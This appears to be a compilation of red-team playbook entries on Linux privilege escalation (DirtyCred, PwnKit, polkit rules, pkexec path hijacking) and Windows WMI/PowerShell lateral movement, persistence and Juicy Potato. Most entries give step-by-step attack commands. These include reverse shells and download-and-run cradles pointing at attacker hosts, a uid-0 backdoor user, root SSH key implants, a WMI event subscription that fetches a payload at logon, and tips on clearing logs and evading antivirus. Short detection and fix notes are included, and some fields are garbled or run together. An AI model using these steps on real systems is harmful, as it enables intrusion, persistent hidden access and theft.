- **Target**: Ubuntu systems (20.04, 21.04)Containers using OverlayFSCloud VMs with unprivileged user access
- **Vulnerability**: CVE-2021-3493Improper OverlayFS mount privilege checks in Ubuntu-patched kernelUser namespace bypass

- **Tools**: ✅ Ubuntu 20.04 / 21.04 with kernel 5.11 or vulnerable versions✅ GCC✅ Custom C exploit (OverlayFS mount wrapper)✅ Linux terminal access✅ Git✅ netcat (optional)✅ whoami, id, uname
- **Scenario**: This simulation demonstrates a privilege escalation vulnerability in Ubuntu's patched OverlayFS module, introduced by Canonical and affecting several Ubuntu versions (including 20.04 and 21.04). By abusing the Linux OverlayFS filesystem and mounting it improperly, unprivileged users can create unauthorized entries in sensitive directories and gain elevated privileges. The flaw lies in how user namespaces allow mounting of OverlayFS without proper capability checks. - **Detection**: - Monitor OverlayFS mount usage- Detect suspicious mount/unmount operations- Check for unexpected setuid binaries- Use auditd for exec/mount tracing
- **Solution**: - Upgrade to patched kernel (Ubuntu 5.11.0-27+)- Disable unprivileged user namespaces if not needed- Use AppArmor or SELinux- Monitor binary modifications

## Dirty Cred – Kernel Credential Exploit

- **Attack Type**: Local Privilege Escalation (LPE)
- **Target**: Linux Desktop / ServerCloud VMsContainers sharing host kernel
- **Vulnerability**: Use-after-free in nf_tables allows kernel memory reuseHijacks freed cred pointer
- **MITRE**: T1068 (Privilege Escalation)T1203 (Exploitation for Client Execution)
- **Impact**: - Root access from any unprivileged user- Bypasses sudo/su- No file or config overwrite- Works inside containers (host kernel)
- **Tools**: ✅ Vulnerable Linux system (5.10.0–5.18)✅ Dirty Cred exploit (dirtycred.c)✅ gcc✅ A low-privileged user✅ Tools: whoami, id, uname, cp, cat✅ Optional: tcpdump, auditd
- **Scenario**: Dirty Cred (CVE-2022-2586) is a kernel-level LPE vulnerability affecting Linux 5.8+ (notably 5.10 LTS). It enables unprivileged users to reuse credential structures from privileged processes by exploiting a use-after-free vulnerability in the Netfilter subsystem (nf_tables). Unlike traditional LPEs, it doesn't overwrite system files — instead, it hijacks credential pointers to impersonate root users. Dirty Cred is stealthy, doesn’t touch disk, and bypasses traditional file monitoring solutions, making it ideal for red team persistence or container escape.
- **Attack Steps**: ### 🟢 STEP 1: Verify Vulnerable KernelRun:uname -r✅ Target: 5.10.x (unpatched)---### 🟢 STEP 2: Confirm You Are a Low Privileged Userwhoami → e.g., studentid → UID ≠ 0---### 🟢 STEP 3: Download Dirty Cred Exploitwget https://raw.githubusercontent.com/kn32/dirtycred/main/dirtycred.cor clone repo:git clone https://github.com/kn32/dirtycred && cd dirtycred---### 🟢 STEP 4: Compile the Exploitgcc dirtycred.c -o dirtycred -static✅ Static binary ensures reliability in minimal systems---### 🟢 STEP 5: Understand What It DoesInstead of file overwrite (like Dirty Pipe), this exploit:• Allocates a fake kernel object• Hijacks freed credential structure• Escalates current user to root by reusing existing root cred---### 🟢 STEP 6: Execute the ExploitRun:./dirtycred✅ If successful:whoami → rootid → uid=0(root)---### 🟢 STEP 7: Post-Exploitation Options• Spawn root shell: bash• Add backdoor user:useradd backadmin -u 0 -o -g 0 -s /bin/bash -M• Add SSH key for root:mkdir /root/.ssh && echo <pubkey> >> /root/.ssh/authorized_keys---### 🛑 STEP 8: Cleanup (Highly Recommended)• Remove exploit: rm dirtycred dirtycred.c• Restore user context• Clear logs: history -c🧠 Tip: Since it doesn’t modify disk, Dirty Cred often evades antivirus, EDR, and file monitoring tools. Detection requires kernel syscall auditing.
- **Detection**: - Monitor kernel logs and auditd for unusual Netfilter access- Use eBPF tools like tracee or bpftrace to track memory corruption- Detect abnormal UID switches- Enable SELinux/AppArmor
- **Solution**: - Upgrade Linux Kernel to patched version (≥ 5.10.102)- Apply vendor security patches- Restrict access to nf_tables if unused- Disable unprivileged user namespaces if not needed
- **Tags**: #DirtyCred #CVE20222586 #LinuxKernelLPE #RedTeam #RootHijack #UseAfterFree #NetfilterExploit #ContainerEscape

## Stack Clash (glibc Bug)

- **Attack Type**: Local Privilege Escalation
- **Target**: Linux systems (Ubuntu, Debian, RHEL, SLES ≤ kernel 4.11.5)Local user shellsPoC vulnerable context
- **Vulnerability**: Inadequate glibc guard-page size (4 KB too small)Stack‑heap/mmap clash exploits memory overlap
- **MITRE**: T1068 (Privilege Escalation)T1203 (Exploitation for Client Execution)
- **Impact**: ➤ Root shell from unprivileged user➤ Full takeover without code signing➤ Works in containers or local shells➤ No file-system modifications
- **Tools**: ✅ Linux VM (e.g., Ubuntu 16.04 with kernel ≤ 4.11.5)✅ gcc✅ Qualys PoC exploit (e.g., stackclash.c)✅ bash, gcc✅ GDB or objdump (optional)✅ Non‑root shell
- **Scenario**: Qualys-discovered Stack Clash (CVE‑2017‑1000364 and related CVEs) affects Linux, BSD, Solaris. Glibc allows the stack to expand past guard pages by growing downward and colliding (“clashing”) with adjacent memory regions (heap, mapped sections). Attackers exploit this to overwrite memory, hijack return addresses, and escalate to root.
- **Attack Steps**: 🟢 STEP 1 – Confirm Vulnerable Kernel & Environment: Run uname -r → must be ≤ 4.11.5 (no guard page fix) (threatpost.com, blog.qualys.com, cvedetails.com). Check glibc version.🟢 STEP 2 – Analyze Stack/Heap Layout: Compile minimal C code that allocates large stack/frame—trigger stack growth. Use ulimit -s unlimited to allow large stack.🟢 STEP 3 – Obtain PoC from Qualys: wget https://qualys.com/…/stackclash.c or clone. Understand 4-stage flow: Clash, Run, Jump, Smash .🟢 STEP 4 – Compile the Exploit: gcc stackclash.c -o stackclash -lpthread.🟢 STEP 5 – Execute in Controlled Lab: ./stackclash. It will allocate memory (Clash), shift SP (Run), cross guard (Jump), overwrite adjacent region (Smash).🟢 STEP 6 – Observe Return Address Hijack: PoC hooks return address to a root_shell() function. After exploit, shell spawns as root.🟢 STEP 7 – Validate Root: Run whoami and id → should output root. Confirm elevated privileges.🟢 STEP 8 – Optional Kernel Debugging: Use gdb to step through exploit stages (alloc, mprotect, return flow) for learning.🛑 STEP 9 – Cleanup: Remove PoC binary, revert lab snapshot. Clear shell history.🧠 Tip: Real-world PoCs include Sudo and Exim exploits (CVE-2017-1000367/69); often used in chained attacks .
- **Detection**: ✅ Audit abnormal stack allocations, monitor ulimit usage✅ Capture process crashes or memory corruption via syslog✅ Use eBPF to detect guard page skips✅ Monitor for root shells from unusual binaries
- **Solution**: ✅ Update to fixed kernels (≥ 4.11.6 or distro patches)✅ Recompile glibc with -fstack-check or enable larger guard-pages ✅ Harden ulimit for untrusted users✅ Use AppArmor/SELinux to confine suid binaries | #StackClash #CVE20171000364 #glibcBug #LocalExploit #PrivilegeEscalation #QualysResearch #PoC #LinuxKernelExploit | Qualys Blog (blog.qualys.com), CVE-DB, Debian DSA (debian.org)
- **Tags**: #StackClash #CVE20171000364 #glibcBug #LocalExploit #PrivilegeEscalation #QualysResearch #PoC #LinuxKernelExploit

## CVE-2021-4034 (PwnKit) – pkexec Local Root

- **Attack Type**: Local Privilege Escalation to Root
- **Target**: Linux Desktops and Servers
- **Vulnerability**: Out-of-bounds write in pkexec
- **MITRE**: T1068 – Exploitation for Privilege Escalation
- **Impact**: Full root access for local users
- **Tools**: GCC, exploit.c, Linux system
- **Scenario**: A critical vulnerability in the pkexec utility (part of polkit) allows any unprivileged local user to gain full root access on Linux. This bug has existed since 2009 and affects nearly every major Linux distribution.
- **Attack Steps**: Step 1: On a Linux machine where you have a normal (non-root) user account, open a terminal window. Step 2: Check if pkexec is installed by typing which pkexec. If installed, it will return a path like /usr/bin/pkexec. Step 3: Download a public proof-of-concept exploit for CVE-2021-4034 from a trusted GitHub source (e.g., seclists or offensive-security). Save it as exploit.c. If you're copying from the web, paste it into a file using nano exploit.c and save. Step 4: Compile the exploit using GCC: run gcc exploit.c -o pwnkit. This creates an executable named pwnkit. Step 5: Make the file executable with chmod +x pwnkit. Step 6: Run the exploit by typing ./pwnkit. If the system is vulnerable and not patched, this command will immediately give you a root shell, indicated by root@hostname. Step 7: Confirm root access by running whoami — it should return root. Step 8: You now have full system control. You can read/write system files, access other users' data, add new users, or install rootkits. Step 9: After testing, exit the root shell using exit. Step 10: If the system is patched (as most are post-2022), the exploit may crash pkexec or simply return no result. Always test this on lab machines or virtual environments (e.g., Ubuntu 20.04 VM with polkit < 0.120) and never on unauthorized systems.
- **Detection**: Monitor /var/log/auth.log for abnormal pkexec calls; detect use of unprivileged users gaining UID 0
- **Solution**: Update polkit package to version 0.120 or later; apply OS security patches; restrict local shell access
- **Tags**: CVE-2021-4034, pkexec, Local Root, Privilege Escalation

## Writable Policy Files (.rules) Abuse

- **Attack Type**: Local Privilege Escalation
- **Target**: Linux desktops, servers, or IoT devices
- **Vulnerability**: Writable .rules files under /etc/polkit-1/rules.d/ or /etc/udev/rules.d/ allowing unauthorized modification
- **MITRE**: T1548.003 (Abuse Elevation Control Mechanism: Polkit, Sudo)
- **Impact**: Root-level access via crafted .rules file without passwordPotential for full system takeover and persistence
- **Tools**: ✅ Linux system with Polkit or udev✅ Terminal access as low-priv user✅ nano, echo, id, pkexec✅ find, chmod, ls, groups✅ Optional: USB device (for udev trigger)✅ inotifywait or auditctl for detection
- **Scenario**: In certain misconfigured Linux systems, the .rules files used by Polkit or udev under /etc/polkit-1/rules.d/ or /etc/udev/rules.d/ are world-writable or user-writable. Attackers with limited access can exploit this misconfiguration to insert malicious rules that escalate privileges without user interaction, allowing root-level command execution or persistence.
- **Attack Steps**: Step 1 – Identify Writable Policy PathsUse the find command to locate policy or udev rule files that are writable:find /etc/polkit-1/rules.d /etc/udev/rules.d -type f -writable 2>/dev/nullLook for .rules files like 50-org.rules or 90-custom.rules. Use ls -l to verify the permissions and ownership.Step 2 – Confirm VulnerabilityTry appending content:echo "// test" >> /etc/polkit-1/rules.d/test.rulesIf you’re able to modify the file without root, it's vulnerable.Step 3 – Create Malicious Polkit RuleUse a text editor to create a malicious rule file:nano /etc/polkit-1/rules.d/99-root-access.rulesPaste the following:javascript<br>polkit.addRule(function(action, subject) {<br> if (subject.isInGroup("sudo")) {<br> return polkit.Result.YES;<br> }<br});<br>This allows users in the sudo group to execute privileged actions without a password.Step 4 – Add Yourself to sudo GroupIf sudo group doesn’t exist, create it:sudo groupadd sudoAdd your user to the group:sudo usermod -aG sudo $(whoami)<brLog out and log back in for group changes to take effect.Step 5 – Trigger the ExploitRun any privileged command via Polkit without password:pkexec id or pkexec /bin/bash<brYou now have a root shell.Optional Step – udev VariantCreate a custom .rules file in /etc/udev/rules.d/99-usb.rules that triggers a script when a USB is plugged in:ACTION=="add", SUBSYSTEM=="usb", RUN+="/bin/bash /tmp/root_shell.sh"<brEnsure /tmp/root_shell.sh has malicious code (e.g., reverse shell) and correct permissions.Step 6 – Cleanup and Stealth (Ethical Sim Only)Remove the added .rules file:rm /etc/polkit-1/rules.d/99-root-access.rules<brRemove user from sudo group if needed:sudo gpasswd -d <user> sudo<brUse logs to verify activity: journalctl -xe<brLog file changes can be monitored using auditd, inotify, or tripwire.
- **Detection**: Monitor .rules file changes using auditctl, inotifywait, or tripwireCorrelate with authentication bypass in journalctl or auth.log
- **Solution**: Remove world-writable permissions:chmod 644 <file> and chown root:root <file>Implement file integrity monitoring (e.g., AIDE, Tripwire)Restrict user write permissionsUpdate Polkit or udev to patched version
- **Tags**: #LinuxEscalation #PolkitExploit #WritableRules #RedTeam #PrivilegeEscalation #OSMisconfig

## Bypass via Misconfigured Polkit Policy (pkla)

- **Attack Type**: Privilege Escalation via Policy Abuse
- **Target**: Linux AI/ML Servers
- **Vulnerability**: Misconfigured Polkit .pkla rules
- **MITRE**: T1068 – Exploitation for Privilege Escalation
- **Impact**: Root-level control of ML pipelines or system services
- **Tools**: Linux VM, text editor (nano, vi)
- **Scenario**: Linux systems that run ML workloads often rely on background services (e.g., JupyterHub, Dask, systemd units). If the PolicyKit (Polkit) system is misconfigured using .pkla files, it can unintentionally allow non-root users to execute root-level actions like restarting services or editing configurations.
- **Attack Steps**: Step 1: Attacker logs in as a standard (non-root) user on the Linux server hosting AI/ML jobs (e.g., Ubuntu or CentOS used to run PyTorch, TensorFlow, or Jupyter). Step 2: Checks for existing .pkla configuration files under /etc/polkit-1/localauthority/. These files define who can run privileged actions. Run find /etc/polkit-1/localauthority/ -name "*.pkla" to locate them. Step 3: If attacker sees policies like Identity=unix-user:* or Action=org.freedesktop.systemd1.manage-units with ResultActive=yes, it means any user can restart or stop services. Step 4: Attacker now lists all services using systemctl list-units --type=service. Step 5: Identifies a critical service such as jupyter.service, ml-worker.service, or even sshd.service. Step 6: Executes systemctl restart jupyter.service — if it works without asking for a password, the system is misconfigured and vulnerable. Step 7: Attacker can now stop or restart key AI services at will, disrupt jobs, kill sessions, or gain lateral access. Step 8: Attacker may go further by using systemctl edit to inject malicious ExecStart paths into ML services. If no password is asked, root control is achieved without sudo. Step 9: Defender may not detect the attack unless auditing is enabled for Polkit. Step 10: This vulnerability stems from over-permissive .pkla rules left by devs or admins trying to simplify permissions for data scientists.
- **Detection**: Check for wildcard policies in .pkla files; monitor journalctl for service control by non-admins
- **Solution**: Use polkitd's modern JavaScript rules; remove legacy .pkla; restrict identities to specific, trusted usernames
- **Tags**: AI Workloads, Jupyter, Systemd, Privilege Escalation

## Abusing GUI Applications using pkexec

- **Attack Type**: Local Privilege Escalation (LPE)
- **Target**: Linux Desktop Systems
- **Vulnerability**: GUI applications that invoke pkexec without proper environment validation
- **MITRE**: T1574.007 (Path Interception via Environment Variables)
- **Impact**: - Local user gains root through GUI path manipulation- GUI app escalates injected binary
- **Tools**: ✅ Linux system with GUI✅ pkexec installed✅ Desktop Environment (GNOME, KDE)✅ GUI apps like gnome-disks, gparted, synaptic✅ xhost, bash, gnome-terminal, dbus-monitor
- **Scenario**: This scenario demonstrates how an attacker can abuse GUI-based Linux applications that internally invoke pkexec (e.g., gparted, synaptic, gnome-disks) to escalate privileges. When these GUI apps use pkexec for privilege elevation but do not properly validate the environment, attackers may inject commands, overwrite binaries, or hijack execution using insecure graphical prompts or insecure environment propagation (e.g., through XDG_SESSION_ID, DISPLAY, or GDK_BACKEND). The attack allows GUI-based privilege escalation from an unprivileged user session.
- **Attack Steps**: Step 1 – Identify a GUI App that Uses pkexecMany GUI-based administrative tools (like gparted, synaptic, or gnome-disks) rely on pkexec to spawn privileged actions. Open one of these using a terminal:gparted & or gnome-disks &Verify whether these prompt for root password and internally use pkexec.Step 2 – Enable X11 Access (If Needed)Run:xhost +local:This allows local processes to access the X session for graphical output.Step 3 – Create a Fake GUI Binary in PATHCreate a malicious replacement for a commonly invoked system tool:bash<br>mkdir /tmp/hijack && cd /tmp/hijack<br>echo -e '#!/bin/bash\necho "Pwned!"\n/bin/bash' > pkexec<br>chmod +x pkexec<br>Step 4 – Manipulate PATH and GDK EnvironmentSet environment variables so that the GUI app invokes your fake binary:bash<br>export PATH=/tmp/hijack:$PATH<br>export GDK_BACKEND=x11<br>This tricks the GUI backend into calling binaries from your modified PATH.Step 5 – Launch the GUI AppRun:gnome-disksorpkexec gnome-terminalIf successful, pkexec will elevate the fake gnome-terminal or binary from the PATH, executing your malicious script with root privileges.Step 6 – Confirm EscalationInside the popped shell, run:whoamiIf output is root, privilege escalation was successful.Step 7 – Cleanup for Ethical UseRemove malicious files:rm -rf /tmp/hijackReset PATH:unset PATHRevoke X11 permissions:xhost -local:Document all steps for ethical reporting.
- **Detection**: - Monitor GUI pkexec invocations- Log pkexec usage with environment variables- Detect DISPLAY, PATH, and XDG_SESSION_ID abuse
- **Solution**: - Avoid calling pkexec without full binary paths- Use PolicyKit rules to restrict GUI apps- Harden GUI session isolation and X11 access permissions
- **Tags**: #pkexec #GUIPrivilegeEscalation #LinuxDesktop #RedTeam #PathHijack #X11Security #GnomeDisks #Synaptic #Polkit #EthicalExploits

## Remote Command Execution via wmic (CMD)

- **Attack Type**: Remote Command Execution (RCE)
- **Target**: Windows Systems (Domain or Workgroup)
- **Vulnerability**: Unrestricted WMIC remote access with valid credentials
- **MITRE**: T1047 (Windows Management Instrumentation)
- **Impact**: Remote command executionLateral movementInitial foothold or post-exploitation
- **Tools**: ✅ Windows CMD/PowerShell✅ WMIC utility (built-in on most Windows versions)✅ Valid credentials (username/password)✅ Network access to target✅ netcat (optional for reverse shell)✅ Windows host
- **Scenario**: This scenario demonstrates how an attacker can leverage wmic (Windows Management Instrumentation Command-line) to remotely execute commands on another Windows system, typically within the same domain or workgroup, using valid credentials. This method is commonly used in lateral movement post-compromise, or as part of remote admin tasks abused by threat actors in environments with weak endpoint monitoring.
- **Attack Steps**: Step 1 – Confirm WMIC AvailabilityOn the attacking machine (Windows), open cmd.exe or PowerShell:wmic /?Ensure wmic is available.Step 2 – Identify Target IP and CredentialsYou need a reachable target system's IP and valid user credentials (typically admin-level). Example:• Target IP: 192.168.1.50• Username: admin• Password: Admin123Step 3 – Basic Remote Command ExecutionUse the following syntax:wmic /node:"192.168.1.50" /user:"admin" /password:"Admin123" process call create "cmd.exe /c calc.exe"This will remotely launch Calculator on the target system.Step 4 – Run More Useful CommandsYou can run commands like:cmd<br>wmic /node:"192.168.1.50" /user:"admin" /password:"Admin123" process call create "cmd.exe /c whoami > C:\\Users\\Public\\info.txt"<br>This creates a file with the output of whoami.Step 5 – Remote Shell Option (Optional)If you want a reverse shell, use a listener on the attacker machine:nc -nlvp 4444<brThen execute remotely:cmd<br>wmic /node:"192.168.1.50" /user:"admin" /password:"Admin123" process call create "cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attackerIP/shell.ps1')"<br>Or use:cmd.exe /c nc.exe attackerIP 4444 -e cmd.exeStep 6 – Verify Execution and Clean UpCheck for created files or running processes on the target. Remove any persistence or artifacts left behind.Use Task Manager or tasklist, and delete files like info.txt.Step 7 – Ethical CleanupDocument all steps, restore system state, revoke reused credentials if used in a lab, and notify stakeholders.
- **Detection**: - Monitor WMIC usage logs- Enable PowerShell and WMI logging- Alert on suspicious process call create events
- **Solution**: - Disable WMIC via GPO if not needed- Restrict remote WMI usage via firewall- Use EDR to monitor child processes from wmic.exe
- **Tags**: #WMIC #RemoteExecution #WindowsRCE #LateralMovement #RedTeam #PostExploitation #EthicalHacking #Sysinternals

## Remote Execution via PowerShell + WMI

- **Attack Type**: Remote Code Execution (RCE)

- **Scenario**: This technique showcases how an attacker can remotely execute commands on a Windows system using PowerShell in combination with WMI (Windows Management Instrumentation). This method is often used in lateral movement during post-exploitation, leveraging valid credentials and WMI classes like Win32_Process to execute commands remotely via Invoke-WmiMethod.
- **Attack Steps**: Step 1 – Identify Target and CredentialsGather target information:• Target hostname/IP: 192.168.1.105• Domain/User: corp\adminuser• Password: AdminPass123Step 2 – Open PowerShell on Attacker MachineUse a Windows system (or a VM with PowerShell available) to open a PowerShell session.Step 3 – Test WMI Connection (Optional)powershell<br>Get-WmiObject -Class Win32_OperatingSystem -ComputerName 192.168.1.105 -Credential (Get-Credential)<br>This confirms WMI access is working.Step 4 – Execute Remote Command via PowerShell + WMITo launch Notepad on the target:powershell<br>Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName 192.168.1.105 -Credential (Get-Credential) -ArgumentList "notepad.exe"<br>This executes notepad.exe on the target system remotely.Step 5 – Execute Arbitrary Commands (RCE)Run remote PowerShell to write a file:powershell<br>Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName 192.168.1.105 -Credential (Get-Credential) -ArgumentList "powershell -Command `"echo hacked > C:\Users\Public\owned.txt`""<br>This drops a file to demonstrate access.Step 6 – Deploy Reverse Shell (Optional)Set up a listener:powershell<br>nc -nlvp 4444<br>Execute remotely:powershell<br>Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName 192.168.1.105 -Credential (Get-Credential) -ArgumentList "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker-ip/shell.ps1')"<br>This method pulls and runs a reverse shell payload.Step 7 – Clean Up (Ethical Use)Remove any test files or scheduled tasks. Log and document actions for audit. Revoke used credentials if temporary.
- **Detection**: - Enable PowerShell logging- Monitor WMI event logs (Event ID 5857+)- Alert on unexpected remote WMI process execution

## WMI Persistence via Event Subscription

- **Attack Type**: Persistence (WMI Event Trigger)
- **Target**: Windows Workstations & Servers
- **Vulnerability**: Abusable WMI namespaces + unrestricted consumer access
- **MITRE**: T1546.003 (Event Triggered Execution: WMI Events)
- **Impact**: - Code execution on every logon- Fileless persistence- Evades common AV scans
- **Tools**: ✅ Windows OS (target)✅ PowerShell✅ WMIC or WMI Explorer✅ Meterpreter (optional)✅ Event Viewer✅ Sysinternals tools (Autoruns, WMI Explorer)
- **Scenario**: This technique demonstrates how an attacker can establish persistence on a Windows system by creating a WMI permanent event subscription. This allows code execution to occur in response to a specific system event (e.g., user logon). Since these subscriptions reside in the WMI repository and do not rely on files or registry keys, they are stealthy and resilient across reboots.
- **Attack Steps**: Step 1 – Identify a Suitable Event Trigger• Choose a relevant trigger to monitor (e.g., user logon, system startup)• Common namespace: root\subscriptionStep 2 – Create Event FilterThis defines what event to monitor:powershell<br>$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{<br> Name = "LogonTrigger";<br> EventNamespace = "root\cimv2";<br> QueryLanguage = "WQL";<br> Query = "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_ComputerSystem' AND TargetInstance.UserName != NULL"<br>}<br>Step 3 – Create the Command Binding (Event Consumer)This defines what to run when the event fires:powershell<br>$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{<br> Name = "MaliciousConsumer";<br> CommandLineTemplate = "powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"<br>}<br>Or use:cmd /c calc.exe to testStep 4 – Bind Filter to Consumerpowershell<br>Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{<br> Filter = $Filter.Path;<br> Consumer = $Consumer.Path<br>}<br>Step 5 – Test the Persistence Mechanism• Log off and log back in• The specified command (calc.exe or PowerShell payload) should execute• Confirm by monitoring process creation via Sysmon or Process ExplorerStep 6 – Stealth Tips• The WMI objects are stored in root\subscription and do not appear in registry or startup folders• Use obfuscated PowerShell commands or alternate base64 payloadsStep 7 – Clean Up (Ethical Use Only)• Identify with:Get-WmiObject -Namespace root\subscription -Class __EventFilterGet-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer• Remove with:$Filter.Delete()$Consumer.Delete()• Or use Autoruns or Sysinternals WMI Explorer to manually delete bindings
- **Detection**: - Use Sysmon to monitor process creation- WMI logging (Event ID 5861, 5860)- Autoruns → WMI tab- WMI Explorer or Get-WmiObject inspections
- **Solution**: - Enable WMI logging- Audit creation of __EventFilter and CommandLineEventConsumer- Use WMI hardening and restrict namespaces- Deploy Sysinternals Autoruns for auditing
- **Tags**: #WMIPersistence #EventConsumer #T1546 #WMIAbuse #RedTeamTTPs #FilelessPersistence

## WMI Enumeration for Reconnaissance

- **Attack Type**: Reconnaissance (Local + Remote)
- **Target**: Windows Workstations & Servers
- **Vulnerability**: Unrestricted WMI namespaces + exposed WinRM/WMI DCOM services
- **MITRE**: T1047 (Windows Management Instrumentation)
- **Impact**: - Silent system profiling- AV evasion- Preparation for privilege escalation or lateral movement
- **Tools**: ✅ PowerShell✅ WMIC CLI✅ WMI Explorer✅ Impacket's wmiexec.py✅ SharpWMI (Red Team tool)✅ Windows default OS tools (cmd.exe)
- **Scenario**: WMI (Windows Management Instrumentation) can be used by attackers to enumerate detailed system information such as user accounts, running processes, installed software, startup items, and more — without needing admin privileges. This technique is commonly used during post-exploitation or lateral movement to silently gather host intelligence. Can be used locally or remotely (via DCOM/WMI).
- **Attack Steps**: Step 1 – Local Enumeration Using WMIC CLIRun from any standard command prompt or elevated shell:• wmic useraccount list full – enumerate all user accounts• wmic group list brief – list local groups• wmic process list brief – running processes• wmic service list brief – running services• wmic startup list full – auto-run applications• wmic logicaldisk get name,size,freespace – disks and usage• wmic nicconfig get Description, MACAddress – network infoStep 2 – Local Enumeration Using PowerShell WMI Cmdlets• Get-WmiObject -Class Win32_OperatingSystem• Get-WmiObject -Class Win32_ComputerSystem• Get-WmiObject -Class Win32_Process• Get-WmiObject -Class Win32_UserAccount• Get-WmiObject -Class Win32_StartupCommandThese cmdlets give structured output and are preferred in scripting.Step 3 – Remote Enumeration via WMICFrom a remote attacker system with valid credentials:wmic /node:<target-ip> /user:<domain\user> /password:<pass> process list briefUse this to gather system, process, service, or disk information remotely.Step 4 – Remote Enumeration via PowerShell RemotingAssuming WinRM is enabled:• Invoke-Command -ComputerName <target-ip> -ScriptBlock { Get-WmiObject Win32_Process }• Useful for stealthy, credentialed enumeration over PS remotingStep 5 – Using Red Team Tools (Optional)• Use SharpWMI.exe to enumerate processes:SharpWMI.exe action=query query="SELECT * FROM Win32_Process"• Use Impacket’s wmiexec.py for shell:wmiexec.py <domain/user>:<pass>@<ip>Inside shell, run commands like:wmic product get name,versionStep 6 – Enumeration Targets• Users• Processes• Software• Network interfaces• System uptime• Domain/workgroup• Security productsAll of this data supports privilege escalation, AV evasion, or lateral movement planning.Step 7 – Clean Up (Optional)• WMI enumeration does not leave files or registry artifacts• Minimal forensic footprint, making detection harder than other methods
- **Detection**: - Enable WMI auditing- Monitor Event IDs 5861, 5860- Monitor excessive WMI queries via Sysmon (Event ID 1)- Track anomalous process creations tied to wmic.exe or powershell.exe
- **Solution**: - Restrict WMI and DCOM usage to administrators- Enable logging for WMI queries- Implement AppLocker policies to restrict script usage- Use EDR to monitor suspicious PowerShell/WMI usage
- **Tags**: #WMIRecon #SystemEnumeration #WMIC #PowerShellRecon #WMIHunting #RedTeamRecon #T1047

## WMI + PowerShell Remoting for Evasion

- **Scenario**: Attackers leverage WMI combined with PowerShell Remoting to execute commands or scripts without writing files to disk, allowing stealthy post-exploitation or lateral movement. This method abuses legitimate Windows services and communication channels, often bypassing basic antivirus and EDR detection because it avoids typical execution indicators like file drops or direct binary execution.
- **Attack Steps**: Step 1 – Verify WinRM is EnabledOn the target machine (if attacker has access):winrm quickconfigEnsure WinRM is set to accept requests.If disabled and attacker has admin:Enable-PSRemoting -ForceStep 2 – Gather Host Information via WMI (Stealth Recon)On attack machine (or compromised host):Get-WmiObject -Class Win32_OperatingSystem -ComputerName <target-ip>Or enumerate logged-in users:Get-WmiObject -Class Win32_LoggedOnUser -ComputerName <target-ip>Step 3 – Execute Remote Command via PowerShell Remoting (In-Memory)Run commands remotely without writing to disk:Invoke-Command -ComputerName <target-ip> -ScriptBlock { Get-Process } -Credential (Get-Credential)Can also launch payloads:Invoke-Command -ComputerName <target-ip> -ScriptBlock { IEX(New-Object Net.WebClient).DownloadString('http://malicious[.]url/script.ps1') }✅ Entire script runs in memory – no file droppedStep 4 – Alternative with WMI Remote Process CreationUse WMI to spawn a process on the remote machine:Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell -nop -w hidden -c <command>" -ComputerName <target-ip>This creates a PowerShell instance remotely, optionally running a stager or backdoorStep 5 – Optional Evasion Enhancements- Use -NoProfile -WindowStyle Hidden -EncodedCommand to obfuscate command- Use IEX and AMSI bypass stagers for stealth- Avoid command logging by modifying $PSDefaultParameterValuesStep 6 – CleanupNo file artifacts left, but processes and logs may remain:• Stop PowerShell sessions• Clear PowerShell history (if not already disabled)• WMI execution won’t create scripts, but logs WMI process spawningStep 7 – Key Notes- Effective for evading AVs that rely on file I/O- Common in red teaming and APT techniques- Relies on system services that are often whitelisted- Can be paired with credential theft or Pass-the-Hash for session reuse
- **Detection**: - Enable PowerShell logging (Module, ScriptBlock Logging)- Monitor Event ID 4104 (PowerShell)- Use Sysmon to detect process creation (ID 1)- Detect WMI process creation via Event ID 4688 or 5861
- **Solution**: - Disable unnecessary remote access (WinRM, WMI)- Enforce JEA (Just Enough Administration)- Use constrained language mode- Implement strict logging and SIEM alerts
- **Tags**: #WMI #PowerShellRemoting #Evasion #RedTeamTTP #T1047 #InMemoryExec #WinRMAbuse #WMIExec

## Juicy Potato – CLSID Abuse

The Juicy Potato exploit abuses DCOM activation and CLSIDs to force the system to impersonate a privileged token and assign it to the attacker's process. It is highly effective on default-configured Windows Server and Desktop environments pre-Windows 10 1803.
- **Attack Steps**: Step 1 – Check PrivilegesOn the low-privileged shell or cmd:whoami /privConfirm presence of SeImpersonatePrivilege.If not available, Juicy Potato will fail.Step 2 – Identify CLSID to AbuseUse published CLSIDs compatible with Juicy Potato.Example:{3E5FC7F9-9A51-4367-9063-A120244FBEC7} – common COM object.Use GitHub or HackTricks to find working CLSIDs.Step 3 – Transfer Juicy Potato and PayloadCopy Juicy Potato executable (JuicyPotato.exe) and a reverse shell or command payload (e.g., nc.exe or cmd.exe) to the target machine.Step 4 – Execute the ExploitRun Juicy Potato with necessary parameters:JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}Where:• -l = listening port• -p = path to payload• -t = token type (usually *)• -c = CLSID✅ If successful, a new command prompt opens as SYSTEMOr attacker gets SYSTEM shell over netcat:nc -nlvp 1337Step 5 – Verify Privilege EscalationIn elevated shell:whoami → Should return NT AUTHORITY\SYSTEMStep 6 – Optional: CleanupDelete JuicyPotato.exe and any copied payloadsClear PowerShell or cmd history if possibleUse Sysinternals’ sdelete for secure file wipe🧠 Tip: Juicy Potato does not work on post-Windows 10 1803+ systems due to token handling changes. For modern systems, use RoguePotato, PrintSpoofer, or PotatoSuite alternatives
- **Detection**: - Monitor usage of known CLSIDs in COM logs- Look for JuicyPotato.exe execution- Monitor process tokens and abnormal impersonation events
- **Solution**: - Patch or upgrade OS to Windows 10 1803+- Remove SeImpersonatePrivilege from non-admins- Use AppLocker to block exploit binaries
